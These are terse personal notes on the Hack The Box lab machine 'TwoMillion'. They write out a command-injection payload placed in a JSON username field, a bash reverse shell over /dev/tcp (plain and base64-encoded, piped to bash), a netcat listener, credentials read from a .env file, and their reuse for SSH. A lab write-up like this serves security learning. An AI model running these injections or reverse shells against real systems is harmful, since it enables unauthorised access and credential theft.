# Twomillion

Tags: Linux
Level: Easy
Status: Done
Date: November 22, 2023

10.10.1.221
------Nmap

Let's paly with curl
end till here to get id command
----curl -X POST [http://2million.htb/api/v1/admin/vpn/generate](http://2million.htb/api/v1/admin/vpn/generate) --cookie "PHPSESSID=ajkhhins4hlnch7p0v4prdn0q6" --header "Content-Type: application/json" --data '{"username":"test;id;"}'

- -------to get reverse shell in command promt nc-lvp 1234
bash -i >& /dev/tcp/10.10.16.7/1234 0>&1 convert this into base64 to pass into username parameter
curl -X POST [http://2million.htb/api/v1/admin/vpn/generate](http://2million.htb/api/v1/admin/vpn/generate) --cookie "PHPSESSID=ajkhhins4hlnch7p0v4prdn0q6" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzEyMzQgMD4mMQo= | base64 -d | bash;"}'
- ----admin password
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
- ---get SSH shell using this admin and above password

using cve exploited machine